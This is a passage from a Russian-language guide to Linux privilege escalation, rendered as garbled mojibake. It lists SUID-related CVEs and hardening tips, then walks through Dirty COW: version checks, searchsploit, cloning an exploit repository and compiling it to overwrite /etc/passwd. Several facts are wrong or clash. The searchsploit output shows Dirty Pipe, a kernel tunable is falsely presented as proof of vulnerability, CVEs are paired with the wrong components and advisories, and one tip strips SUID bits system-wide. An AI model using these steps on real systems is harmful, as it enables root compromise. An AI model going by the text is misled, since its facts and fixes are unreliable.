- –ü—Ä–æ–≤–µ—Ä—è—Ç—å –ø—É—Ç–∏ –≤ –≤—ã–∑–æ–≤–∞—Ö –∫–æ–º–∞–Ω–¥ (`use /bin/tar` –≤–º–µ—Å—Ç–æ `tar`)
- –ò—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å `secure_path` –≤ `/etc/sudoers` –∏ –æ–≥—Ä–∞–Ω–∏—á–µ–Ω–∏–µ –Ω–∞ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã–µ –æ–∫—Ä—É–∂–µ–Ω–∏—è

### –ü–∞—Å—Å–∏–≤–Ω—ã–µ –º–µ—Ä—ã:
1. **–ú–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥ –ª–æ–≥–æ–≤ –∏ –∞—É–¥–∏—Ç —Ñ–∞–π–ª–æ–≤**  
   - `auditd` –¥–ª—è —Å–ª–µ–∂–µ–Ω–∏—è –∑–∞ –≤—ã–∑–æ–≤–∞–º–∏ `setuid/setgid`
   - —Ä–µ–≥—É–ª—è—Ä–Ω—ã–π –∑–∞–ø—É—Å–∫ `AIDE`/`Tripwire` –¥–ª—è –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω—ã—Ö —Å—É–º–º
   - —Ä–µ–≥—É–ª—è—Ä–Ω—ã–π –∞—É–¥–∏—Ç SUID/SGID-—Ñ–∞–π–ª–æ–≤ (`auditctl`)
2. **CI/CD‚Äë—Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ**  
   - –ø—Ä–æ–≤–µ—Ä—è—Ç—å –Ω–æ–≤—ã–µ –±–∏–Ω–∞—Ä–Ω–∏–∫–∏ –Ω–∞ –Ω–∞–ª–∏—á–∏–µ SUID/SGID –ø–µ—Ä–µ–¥ –¥–µ–ø–ª–æ–µ–º
3. **–û–±—É—á–µ–Ω–∏–µ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–æ–≤**  
   ‚Äì –≤–Ω—É—Ç—Ä–µ–Ω–Ω–∏–µ –ø–æ–ª–∏—Ç–∏–∫–∏: –∫–æ–≥–¥–∞ –¥–µ–π—Å—Ç–≤–∏—Ç–µ–ª—å–Ω–æ —Ç—Ä–µ–±—É–µ—Ç—Å—è SUID, –∞ –∫–æ–≥–¥–∞ –º–æ–∂–Ω–æ –æ–±–æ–π—Ç–∏—Å—å capability.  
4. **–†–µ–≥—É–ª—è—Ä–Ω—ã–π –∞—É–¥–∏—Ç —Å–∏—Å—Ç–µ–º—ã:**
   - –ù–∞—Å—Ç—Ä–æ–π–∫–∞ cron-—Å–ª—É–∂–± –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏ —Å–ø–∏—Å–∫–∞ SUID/SGID-–±–∏–Ω–∞—Ä–Ω–∏–∫–æ–≤
5. **–û–±–Ω–æ–≤–ª–µ–Ω–∏–µ –ü–û**:
   - –£—Å—Ç–∞–Ω–æ–≤–∫–∞ –∏—Å–ø—Ä–∞–≤–ª–µ–Ω–∏–π –¥–ª—è —É—è–∑–≤–∏–º—ã—Ö –±–∏–Ω–∞—Ä–Ω–∏–∫–æ–≤:

---

## –†–µ–∞–ª—å–Ω—ã–µ –∫–µ–π—Å—ã

1. **PwnKit: Mass Linux Compromise (2022)**  
   - **CVE:** CVE-2021-4034  
   - **–≠–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏—è:** –£—è–∑–≤–∏–º–æ—Å—Ç—å –≤ SUID-–±–∏–Ω–∞—Ä–Ω–∏–∫–µ `pkexec` –ø–æ–∑–≤–æ–ª—è–ª–∞ –∑–∞–≥—Ä—É–∂–∞—Ç—å –ø—Ä–æ–∏–∑–≤–æ–ª—å–Ω—ã–µ –±–∏–±–ª–∏–æ—Ç–µ–∫–∏  
   - **–ó–∞—Ç—Ä–æ–Ω—É—Ç–æ:** 95% Linux-—Å–∏—Å—Ç–µ–º (–≤–∫–ª—é—á–∞—è RHEL, Ubuntu, Debian)  
   - **–ü–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ:** [Qualys Advisory](https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt)  


2. **Sudoedit Privilege Escalation (2023)**  
   - **CVE:** CVE-2023-22809  
   - **–≠–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏—è:** –ü–æ–¥–º–µ–Ω–∞ —Ä–µ–¥–∞–∫—Ç–æ—Ä–∞ —á–µ—Ä–µ–∑ PATH –≤ SUID-–±–∏–Ω–∞—Ä–Ω–∏–∫–µ `sudoedit`  
   - **–ó–∞—Ç—Ä–æ–Ω—É—Ç–æ:** Sudo 1.8.0 - 1.9.12p1 –Ω–∞ 2M+ —Å–µ—Ä–≤–µ—Ä–∞—Ö  
   - **–ü–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ:** [sudo.ws Security Advisory](https://www.sudo.ws/security/advisories/unescape_overflow/)  


3. **Exim Mail Server Takeover (2020)**  
   - **CVE:** CVE-2019-10149  
   - **–≠–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏—è:** –£—è–∑–≤–∏–º–æ—Å—Ç—å –≤ SUID-–∫–æ–º–ø–æ–Ω–µ–Ω—Ç–µ `exim` –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –∫–æ–º–∞–Ω–¥ –æ—Ç root  
   - **–ó–∞—Ç—Ä–æ–Ω—É—Ç–æ:** 500,000+ –ø–æ—á—Ç–æ–≤—ã—Ö —Å–µ—Ä–≤–µ—Ä–æ–≤  
   - **–ü–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ:** [Exim Security Advisory](https://www.exim.org/static/doc/CVE-2019-10149.txt)  


4. **Screen Escape Room (2021)**  
   - **CVE:** CVE-2021-26937  
   - **–≠–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏—è:** –£—è–∑–≤–∏–º–æ—Å—Ç—å –≤ SUID-—É—Ç–∏–ª–∏—Ç–µ `screen` –≤–µ—Ä—Å–∏–π < 4.8.0  
   - **–ó–∞—Ç—Ä–æ–Ω—É—Ç–æ:** –°—Ç–∞—Ä—ã–µ —Å–∏—Å—Ç–µ–º—ã —Å —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω—ã–º screen (–æ—Å–æ–±–µ–Ω–Ω–æ HPC-–∫–ª–∞—Å—Ç–µ—Ä—ã)  
   - **–ü–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ:** [GNU Screen Security](https://lists.gnu.org/archive/html/screen-devel/2021-02/msg00000.html)  


5. **Netfilter Rootkit Installation (2022)**  
   - **CVE:** CVE-2022-25636  
   - **–≠–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏—è:** –£—è–∑–≤–∏–º–æ—Å—Ç—å –≤ SUID-–±–∏–Ω–∞—Ä–Ω–∏–∫–µ `nfp` (Netfilter)  
   - **–ó–∞—Ç—Ä–æ–Ω—É—Ç–æ:** –°–∏—Å—Ç–µ–º—ã —Å nftables 1.0.1 - 1.0.7  
   - **–ü–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ:** [Netfilter Advisory](https://www.openwall.com/lists/oss-security/2022/02/20/1)  


6. **GNU Binutils Data Theft (2023)**  
   - **CVE:** CVE-2023-1579  
   - **–≠–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏—è:** –£—è–∑–≤–∏–º–æ—Å—Ç—å –≤ `objdump` (SUID –≤ –Ω–µ–∫–æ—Ç–æ—Ä—ã—Ö –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è—Ö)  
   - **–ó–∞—Ç—Ä–æ–Ω—É—Ç–æ:** –ö–∞—Å—Ç–æ–º–Ω—ã–µ –≤—Å—Ç—Ä–∞–∏–≤–∞–µ–º—ã–µ —Å–∏—Å—Ç–µ–º—ã  
   - **–ü–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ:** [GNU Binutils Security](https://sourceware.org/pipermail/binutils/2023-March/126717.html)  


7. **Vmware Workstation Escape (2024)**  
   - **CVE:** CVE-2024-22245  
   - **–≠–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏—è:** –£—è–∑–≤–∏–º–æ—Å—Ç—å –≤ SUID-–∫–æ–º–ø–æ–Ω–µ–Ω—Ç–µ `vmware-user-suid-wrapper`  
   - **–ó–∞—Ç—Ä–æ–Ω—É—Ç–æ:** VMware Workstation 17.x, Fusion 13.x  
   - **–ü–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ:** [VMware Security Advisory](https://www.vmware.com/security/advisories/VMSA-2024-0004.html)  

---

## –ó–∞–∫–ª—é—á–µ–Ω–∏–µ

–≠–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏—è SUID/SGID-–±–∏–Ω–∞—Ä–Ω–∏–∫–æ–≤ –∏ –∑–ª–æ—É–ø–æ—Ç—Ä–µ–±–ª–µ–Ω–∏–µ –ø–µ—Ä–µ–º–µ–Ω–Ω–æ–π `PATH` –æ—Å—Ç–∞—é—Ç—Å—è –Ω–∞–∏–±–æ–ª–µ–µ —ç—Ñ—Ñ–µ–∫—Ç–∏–≤–Ω—ã–º–∏ –º–µ—Ç–æ–¥–∞–º–∏ –ø–æ–≤—ã—à–µ–Ω–∏—è –ø—Ä–∏–≤–∏–ª–µ–≥–∏–π –≤ Linux-—Å–∏—Å—Ç–µ–º–∞—Ö. 
–≠—Ç–∏ –∞—Ç–∞–∫–∏ –Ω–µ —Ç—Ä–µ–±—É—é—Ç —Å–ª–æ–∂–Ω—ã—Ö —É—è–∑–≤–∏–º–æ—Å—Ç–µ–π –Ω—É–ª–µ–≤–æ–≥–æ –¥–Ω—è ‚Äî –æ–Ω–∏ —ç–∫—Å–ø–ª—É–∞—Ç–∏—Ä—É—é—Ç —Ñ—É–Ω–¥–∞–º–µ–Ω—Ç–∞–ª—å–Ω—ã–µ –æ—à–∏–±–∫–∏ –≤ –ø—Ä–æ–µ–∫—Ç–∏—Ä–æ–≤–∞–Ω–∏–∏ –∏ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∏—Ä–æ–≤–∞–Ω–∏–∏ —Å–∏—Å—Ç–µ–º. 
–£—Å–ø–µ—à–Ω–∞—è –∫–æ–º–ø—Ä–æ–º–µ—Ç–∞—Ü–∏—è –ø—Ä–∏–≤–æ–¥–∏—Ç –∫ –ø–æ–ª–Ω–æ–º—É –∫–æ–Ω—Ç—Ä–æ–ª—é –Ω–∞–¥ —Å–∏—Å—Ç–µ–º–æ–π (root-–¥–æ—Å—Ç—É–ø), –ø—Ä–∏ —ç—Ç–æ–º –∞—Ç–∞–∫–∏ —Å–ª–æ–∂–Ω–æ –¥–µ—Ç–µ–∫—Ç–∏—Ä–æ–≤–∞—Ç—å –∏–∑-–∑–∞ –∏—Ö –ª–µ–≥–∏—Ç–∏–º–Ω–æ–≥–æ —Ö–∞—Ä–∞–∫—Ç–µ—Ä–∞.

### –ö–ª—é—á–µ–≤—ã–µ —Ä–∏—Å–∫–∏:
1. **SUID/SGID-–±–∏–Ω–∞—Ä–Ω–∏–∫–∏**:
   - –ù–µ–∫–æ–Ω—Ç—Ä–æ–ª–∏—Ä—É–µ–º–æ–µ —Ä–∞—Å–ø—Ä–æ—Å—Ç—Ä–∞–Ω–µ–Ω–∏–µ –ø—Ä–∏–≤–∏–ª–µ–≥–∏–π (42+ SUID-—Ñ–∞–π–ª–æ–≤ –≤ —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω–æ–π —É—Å—Ç–∞–Ω–æ–≤–∫–µ)
   - –£—Å—Ç–∞—Ä–µ–≤—à–∏–µ/–Ω–µ–∏—Å–ø–æ–ª—å–∑—É–µ–º—ã–µ –±–∏–Ω–∞—Ä–Ω–∏–∫–∏ —Å root-–ø—Ä–∏–≤–∏–ª–µ–≥–∏—è–º–∏
   - –£—è–∑–≤–∏–º–æ—Å—Ç–∏ –≤ –ª–µ–≥–∏—Ç–∏–º–Ω–æ–º –ü–û (pkexec, sudo, tar)
   - –ù–µ–±–µ–∑–æ–ø–∞—Å–Ω—ã–µ –≤—ã–∑–æ–≤—ã `system()`/`exec()` –≤ –∫–∞—Å—Ç–æ–º–Ω—ã—Ö —Å–∫—Ä–∏–ø—Ç–∞—Ö

2. **–ó–ª–æ—É–ø–æ—Ç—Ä–µ–±–ª–µ–Ω–∏–µ PATH**:
   - –ö—Ä–∏—Ç–∏—á–µ—Å–∫–∞—è –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç—å –æ—Ç –ø–µ—Ä–µ–º–µ–Ω–Ω—ã—Ö –æ–∫—Ä—É–∂–µ–Ω–∏—è –≤ –ø—Ä–∏–≤–∏–ª–µ–≥–∏—Ä–æ–≤–∞–Ω–Ω—ã—Ö –∫–æ–Ω—Ç–µ–∫—Å—Ç–∞—Ö
   - –û—Ç—Å—É—Ç—Å—Ç–≤–∏–µ –∞–±—Å–æ–ª—é—Ç–Ω—ã—Ö –ø—É—Ç–µ–π –≤ cron-–∑–∞–¥–∞—á–∞—Ö –∏ —Å–∏—Å—Ç–µ–º–Ω—ã—Ö —Å–∫—Ä–∏–ø—Ç–∞—Ö
   - –í–æ–∑–º–æ–∂–Ω–æ—Å—Ç—å –ø–æ–¥–º–µ–Ω—ã —Å—Ç–∞–Ω–¥–∞—Ä—Ç–Ω—ã—Ö —É—Ç–∏–ª–∏—Ç (curl, wget, tar)
   - –ù–∞—Å–ª–µ–¥–æ–≤–∞–Ω–∏–µ –æ–∫—Ä—É–∂–µ–Ω–∏—è –≤ SUID-–ø—Ä–æ—Ü–µ—Å—Å–∞—Ö

3. **–°–∏—Å—Ç–µ–º–Ω—ã–µ –ø–æ—Å–ª–µ–¥—Å—Ç–≤–∏—è**:
   - –ü–æ–ª—É—á–µ–Ω–∏–µ —É—Å—Ç–æ–π—á–∏–≤–æ–≥–æ root-–¥–æ—Å—Ç—É–ø–∞ –∑–∞ 3-5 –º–∏–Ω—É—Ç
   - –°–∫—Ä—ã—Ç–∞—è –ø–µ—Ä—Å–∏—Å—Ç–µ–Ω—Ü–∏—è —á–µ—Ä–µ–∑ –±—ç–∫–¥–æ—Ä—ã –∏ —Å–∫—Ä—ã—Ç—ã—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π
   - –ö–æ–º–ø—Ä–æ–º–µ—Ç–∞—Ü–∏—è –≤—Å–µ–π –∏–Ω—Ñ—Ä–∞—Å—Ç—Ä—É–∫—Ç—É—Ä—ã —á–µ—Ä–µ–∑ –æ–¥–Ω—É —Å–ª–∞–±—É—é –Ω–æ–¥—É
   - –≠—Å–∫–∞–ª–∞—Ü–∏—è –∞—Ç–∞–∫ –≤ –æ–±–ª–∞—á–Ω—ã—Ö —Å—Ä–µ–¥–∞—Ö –∏ –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–∞—Ö

### –†–µ–∫–æ–º–µ–Ω–¥–∞—Ü–∏–∏ –ø–æ –∑–∞—â–∏—Ç–µ:
1. **–ñ—ë—Å—Ç–∫–∏–π –ª–∏–º–∏—Ç–∏–Ω–≥**:
   ```bash
   # –†–µ–≥—É–ª—è—Ä–Ω—ã–π –∞—É–¥–∏—Ç –∏ —É–¥–∞–ª–µ–Ω–∏–µ
   find / -perm /4000 -exec chmod u-s {} \;
   find / -perm /2000 -exec chmod g-s {} \;
   ```
2. **–ó–∞–º–µ–Ω–∞ –Ω–∞ Linux Capabilities**:
   ```bash
   setcap cap_dac_override=ep /usr/bin/custom_tool
   ```
3. **–¢–µ—Ö–Ω–∏—á–µ—Å–∫–∏–µ –æ–≥—Ä–∞–Ω–∏—á–µ–Ω–∏—è**:
   - –ú–æ–Ω—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ —Ç–æ–º–æ–≤ —Å `nosuid`
   - AppArmor/SELinux –ø—Ä–æ—Ñ–∏–ª–∏ –¥–ª—è –≤—Å–µ—Ö SUID-–±–∏–Ω–∞—Ä–Ω–∏–∫–æ–≤
   - –ö–æ–º–ø–∏–ª—è—Ü–∏—è —Å `-fno-PIE -z noexecstack`

4. **–ù–µ–ø—Ä–µ—Ä—ã–≤–Ω—ã–π –∞—É–¥–∏—Ç**:
   ```bash
   # Daily cron job
   diff /etc/suid_audit.log <(find / -perm /4000 2>/dev/null)
   ```
5. **–ö–æ–Ω—Ç—Ä–æ–ª—å —Ü–µ–ª–æ—Å—Ç–Ω–æ—Å—Ç–∏**:
   - AIDE/Tripwire —Å –ø—Ä–æ–≤–µ—Ä–∫–æ–π SUID-—Ñ–∞–π–ª–æ–≤ –∏ /etc/environment
   - –°–∏–≥–Ω–∞–ª–∏–∑–∞—Ü–∏—è –ø—Ä–∏ –∏–∑–º–µ–Ω–µ–Ω–∏–∏ PATH –≤ runtime

6. **–ê—Ä—Ö–∏—Ç–µ–∫—Ç—É—Ä–Ω—ã–µ –ø—Ä–∏–Ω—Ü–∏–ø—ã**:
   - Zero Trust –¥–ª—è –ø—Ä–∏–≤–∏–ª–µ–≥–∏—Ä–æ–≤–∞–Ω–Ω—ã—Ö –æ–ø–µ—Ä–∞—Ü–∏–π
   - –ó–∞–ø—É—Å–∫ —Å–ª—É–∂–± –≤ rootless-–∫–æ–Ω—Ç–µ–π–Ω–µ—Ä–∞—Ö
   - Immutable-–∏–Ω—Ñ—Ä–∞—Å—Ç—Ä—É–∫—Ç—É—Ä–∞ –¥–ª—è –∫—Ä–∏—Ç–∏—á–Ω—ã—Ö —Å–∏—Å—Ç–µ–º

---

---

# 4. –≠–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏—è —è–¥—Ä–∞ Linux

–≠–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏—è —É—è–∑–≤–∏–º–æ—Å—Ç–µ–π —è–¥—Ä–∞ Linux ‚Äî –æ–¥–∏–Ω –∏–∑ –Ω–∞–∏–±–æ–ª–µ–µ —ç—Ñ—Ñ–µ–∫—Ç–∏–≤–Ω—ã—Ö –º–µ—Ç–æ–¥–æ–≤ –ø–æ–≤—ã—à–µ–Ω–∏—è –ø—Ä–∏–≤–∏–ª–µ–≥–∏–π, –ø–æ–∑–≤–æ–ª—è—é—â–∏–π –∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫—É –ø–æ–ª—É—á–∏—Ç—å –ø–æ–ª–Ω—ã–π –∫–æ–Ω—Ç—Ä–æ–ª—å –Ω–∞–¥ —Å–∏—Å—Ç–µ–º–æ–π. 
–£—è–∑–≤–∏–º–æ—Å—Ç–∏ –≤ —è–¥—Ä–µ –∫—Ä–∏—Ç–∏—á–Ω—ã, –ø–æ—Å–∫–æ–ª—å–∫—É —è–¥—Ä–æ –∏–º–µ–µ—Ç –Ω–∞–∏–≤—ã—Å—à–∏–π —É—Ä–æ–≤–µ–Ω—å –ø—Ä–∏–≤–∏–ª–µ–≥–∏–π (Ring 0) –∏ —É–ø—Ä–∞–≤–ª—è–µ—Ç –≤—Å–µ–º–∏ —Å–∏—Å—Ç–µ–º–Ω—ã–º–∏ —Ä–µ—Å—É—Ä—Å–∞–º–∏.  

–Ø–¥—Ä–æ Linux ‚Äî —Ü–µ–Ω—Ç—Ä–∞–ª—å–Ω—ã–π –∫–æ–º–ø–æ–Ω–µ–Ω—Ç –û–°, –æ—Ç–≤–µ—á–∞—é—â–∏–π –∑–∞:
1. –£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –ø–∞–º—è—Ç—å—é –∏ –ø—Ä–æ—Ü–µ—Å—Å–∞–º–∏  
2. –ö–æ–Ω—Ç—Ä–æ–ª—å –¥–æ—Å—Ç—É–ø–∞ –∫ –∞–ø–ø–∞—Ä–∞—Ç–Ω—ã–º —Ä–µ—Å—É—Ä—Å–∞–º  
3. –†–µ–∞–ª–∏–∑–∞—Ü–∏—é —Å–∏—Å—Ç–µ–º–Ω—ã—Ö –≤—ã–∑–æ–≤–æ–≤  
–£—è–∑–≤–∏–º–æ—Å—Ç–∏ –≤ —è–¥—Ä–µ (—á–∞—Å—Ç–æ –≤—ã–∑–≤–∞–Ω–Ω—ã–µ –æ—à–∏–±–∫–∞–º–∏ –≤ –ø–æ–¥—Å–∏—Å—Ç–µ–º–∞—Ö: –≤–∏—Ä—Ç—É–∞–ª—å–Ω–∞—è –ø–∞–º—è—Ç—å, —Å–µ—Ç–µ–≤–æ–π —Å—Ç–µ–∫, –¥—Ä–∞–π–≤–µ—Ä—ã) –ø–æ–∑–≤–æ–ª—è—é—Ç –æ–±–æ–π—Ç–∏ –≤—Å–µ –º–µ—Ö–∞–Ω–∏–∑–º—ã –∑–∞—â–∏—Ç—ã.  

**–ö–ª—é—á–µ–≤—ã–µ –æ—Å–æ–±–µ–Ω–Ω–æ—Å—Ç–∏:**  
- –¢—Ä–µ–±—É—é—Ç –≥–ª—É–±–æ–∫–æ–≥–æ –ø–æ–Ω–∏–º–∞–Ω–∏—è –∞—Ä—Ö–∏—Ç–µ–∫—Ç—É—Ä—ã –û–°  
- –ß–∞—Å—Ç–æ —ç–∫—Å–ø–ª—É–∞—Ç–∏—Ä—É—é—Ç race conditions –∏–ª–∏ –æ—à–∏–±–∫–∏ —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è –ø–∞–º—è—Ç—å—é  
- –≠—Ñ—Ñ–µ–∫—Ç–∏–≤–Ω—ã –ø—Ä–æ—Ç–∏–≤ —Å–∏—Å—Ç–µ–º –±–µ–∑ —Å–æ–≤—Ä–µ–º–µ–Ω–Ω—ã—Ö –∑–∞—â–∏—Ç (KASLR, SMEP, SMAP)  

---

## MITRE ATT&CK

**[T1068]**  
**Exploitation for Privilege Escalation**  
üîó https://attack.mitre.org/techniques/T1068/

### –ü—Ä–∏–º–µ—Ä 1: Dirty COW (CVE-2016-5195) - –≠–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏—è —É—è–∑–≤–∏–º–æ—Å—Ç–∏ —è–¥—Ä–∞ –≤ –º–µ—Ö–∞–Ω–∏–∑–º–µ Copy-On-Write
> –£—è–∑–≤–∏–º–æ—Å—Ç—å –≤ –º–µ—Ö–∞–Ω–∏–∑–º–µ COW –ø–æ–¥—Å–∏—Å—Ç–µ–º—ã –≤–∏—Ä—Ç—É–∞–ª—å–Ω–æ–π –ø–∞–º—è—Ç–∏ —è–¥—Ä–∞ Linux. –ü–æ–∑–≤–æ–ª—è–µ—Ç –ø–µ—Ä–µ–∑–∞–ø–∏—Å—ã–≤–∞—Ç—å read-only —Ñ–∞–π–ª—ã —á–µ—Ä–µ–∑ race condition –º–µ–∂–¥—É —Å–∏—Å—Ç–µ–º–Ω—ã–º–∏ –≤—ã–∑–æ–≤–∞–º–∏ madvise() –∏ write().

**–£—Å–ª–æ–≤–∏—è —ç–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏–∏:**  
- –Ø–¥—Ä–∞ Linux –≤–µ—Ä—Å–∏–π 2.6.22 ‚Äî 4.8.3  
- –ù–∞–ª–∏—á–∏–µ —Ñ–∞–π–ª–æ–≤ —Å read-only –ø—Ä–∞–≤–∞–º–∏ (–Ω–∞–ø—Ä–∏–º–µ—Ä, `/etc/passwd`)  

**–ú–µ—Ö–∞–Ω–∏–∑–º:**  
1. –°–æ–∑–¥–∞–Ω–∏–µ –¥–≤—É—Ö –∫–æ–Ω–∫—É—Ä–∏—Ä—É—é—â–∏—Ö –ø–æ—Ç–æ–∫–æ–≤  
2. –≠–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏—è —Å–æ—Å—Ç–æ—è–Ω–∏—è –≥–æ–Ω–∫–∏ –º–µ–∂–¥—É:  
   - –ü–æ—Ç–æ–∫ 1: `madvise()` (–ë–µ—Å–∫–æ–Ω–µ—á–Ω–æ –≤—ã–∑—ã–≤–∞–µ—Ç `madvise(MADV_DONTNEED)`)  
   - –ü–æ—Ç–æ–∫ 2: `write()` (–ü—Ä–æ–∏–∑–≤–æ–¥–∏—Ç –∑–∞–ø–∏—Å—å –≤ map —á–µ—Ä–µ–∑ `/proc/self/mem`)  
3. –†–µ–∑—É–ª—å—Ç–∞—Ç: –ü–µ—Ä–µ–∑–∞–ø–∏—Å—å read-only —Ñ–∞–π–ª–æ–≤ (–Ω–∞–ø—Ä–∏–º–µ—Ä, `/etc/passwd`)  

---

#### [TA0007] ‚Äì Discovery (–†–∞–∑–≤–µ–¥–∫–∞)
> –ü–æ–¥—Ç–≤–µ—Ä–¥–∏—Ç—å –Ω–∞–ª–∏—á–∏–µ —É—è–∑–≤–∏–º–æ–π –≤–µ—Ä—Å–∏–∏ —è–¥—Ä–∞  

```bash
# 1. –û–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ –≤–µ—Ä—Å–∏–∏ —è–¥—Ä–∞
uname -r  # 3.10.0-1127.el7.x86_64

# 2. –ü—Ä–æ–≤–µ—Ä–∫–∞ –∑–Ω–∞—á–µ–Ω–∏—è dirty_writeback_centisecs (–∏–Ω–¥–∏–∫–∞—Ç–æ—Ä —É—è–∑–≤–∏–º–æ—Å—Ç–∏)
cat /proc/sys/vm/dirty_writeback_centisecs  # –ó–Ω–∞—á–µ–Ω–∏–µ 500 –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–∞–µ—Ç —É—è–∑–≤–∏–º–æ—Å—Ç—å

# 3. –ü–æ–∏—Å–∫ —ç–∫—Å–ø–ª–æ–∏—Ç–æ–≤
searchsploit dirty cow
# –í—ã–≤–æ–¥: 
# Linux Kernel 2.6.22 < 4.8.3 - 'Dirty COW' /proc/self/mem Race Condition Privilege Escalation (SUID Method)
```
- `uname -r`: –û–ø—Ä–µ–¥–µ–ª—è–µ—Ç –≤–µ—Ä—Å–∏—é —è–¥—Ä–∞ (–£—è–∑–≤–∏–º—ã–µ –≤–µ—Ä—Å–∏–∏ –∏–º–µ—é—Ç –ø–∞—Ç—á-—É—Ä–æ–≤–µ–Ω—å —è–¥—Ä–∞ 2.6.22 < –≤–µ—Ä—Å–∏—è < 4.8.3)
- `dirty_writeback_centisecs`: –∫–æ–Ω—Ç—Ä–æ–ª–∏—Ä—É–µ—Ç —á–∞—Å—Ç–æ—Ç—É –∑–∞–ø–∏—Å–∏ "–≥—Ä—è–∑–Ω—ã—Ö" —Å—Ç—Ä–∞–Ω–∏—Ü; –∑–Ω–∞—á–µ–Ω–∏–µ 500 –º—Å —Ö–∞—Ä–∞–∫—Ç–µ—Ä–Ω–æ –¥–ª—è —É—è–∑–≤–∏–º—ã—Ö —Å–∏—Å—Ç–µ–º
- `searchsploit`: –∏—â–µ—Ç –≤ –ª–æ–∫–∞–ª—å–Ω–æ–π –±–∞–∑–µ Exploit-DB  
  `grep -q 'Dirty COW' /usr/share/exploitdb/exploits/linux/local/*`: –∞–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–Ω—ã–π –≤–∞—Ä–∏–∞–Ω—Ç –ø–æ–∏—Å–∫–∞

---

#### [TA0004] ‚Äì Privilege Escalation (–ü–æ–≤—ã—à–µ–Ω–∏–µ –ø—Ä–∏–≤–∏–ª–µ–≥–∏–π)
**–®–∞–≥ 1: –ü–æ–¥–≥–æ—Ç–æ–≤–∫–∞ —ç–∫—Å–ø–ª–æ–∏—Ç–∞**  
```bash
# –ü–æ–∏—Å–∫ —ç–∫—Å–ø–ª–æ–∏—Ç–æ–≤
searchsploit dirty cow
# –í—ã–≤–æ–¥:
# Linux Kernel 5.8 < 5.16.11 - 'Dirty Pipe' Pipe Mechanism Local Privilege Escalation

# –ê–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–Ω—ã–π –≤–∞—Ä–∏–∞–Ω—Ç –∑–∞–≥—Ä—É–∑–∫–∏:
git clone https://github.com/dirtycow/dirtycow.github.io.git

# –ö–æ–º–ø–∏–ª—è—Ü–∏—è –Ω–∞–π–¥–µ–Ω–Ω–æ–≥–æ —ç–∫—Å–ø–ª–æ–π—Ç–∞
gcc dirtyc0w.c -o dirtyc0w
```
1. `mmap()`: –û—Ç–æ–±—Ä–∞–∂–∞–µ—Ç –∑–∞—â–∏—â–µ–Ω–Ω—ã–π —Ñ–∞–π–ª (–Ω–∞–ø—Ä–∏–º–µ—Ä, `/etc/passwd`) –≤ –ø–∞–º—è—Ç—å
2. –°–æ–∑–¥–∞–µ—Ç –¥–≤–∞ –ø–æ—Ç–æ–∫–∞ –∏—Å–ø–æ–ª—å–∑—É—è **race condition**:
   - **–ü–æ—Ç–æ–∫ 1**: –ë–µ—Å–∫–æ–Ω–µ—á–Ω—ã–π —Ü–∏–∫–ª, `madvise(MADV_DONTNEED)` –ø—Ä–∏–Ω—É–¥–∏—Ç–µ–ª—å–Ω–æ –≤—ã–≥—Ä—É–∂–∞–µ—Ç –ø–∞–º—è—Ç—å —Å—Ç—Ä–∞–Ω–∏—Ü—ã –∏–∑ –∫—ç—à–∞
   - **–ü–æ—Ç–æ–∫ 2**: –ó–∞–ø–∏—Å—å –≤ /proc/self/mem, `write()` –≤ –∫–æ–Ω–∫—É—Ä–µ–Ω—Ç–Ω–æ–º –ø–æ—Ç–æ–∫–µ –∑–∞–ø–∏—Å—ã–≤–∞–µ—Ç –¥–∞–Ω–Ω—ã–µ –≤ –æ—Å–≤–æ–±–æ–∂–¥–µ–Ω–Ω—É—é –æ–±–ª–∞—Å—Ç—å –ø–∞–º—è—Ç–∏
3. –†–µ–∑—É–ª—å—Ç–∞—Ç: –ü–µ—Ä–µ–∑–∞–ø–∏—Å—å –∑–∞—â–∏—â–µ–Ω–Ω–æ–≥–æ —Ñ–∞–π–ª–∞ (–Ω–∞–ø—Ä–∏–º–µ—Ä, `/etc/passwd`)

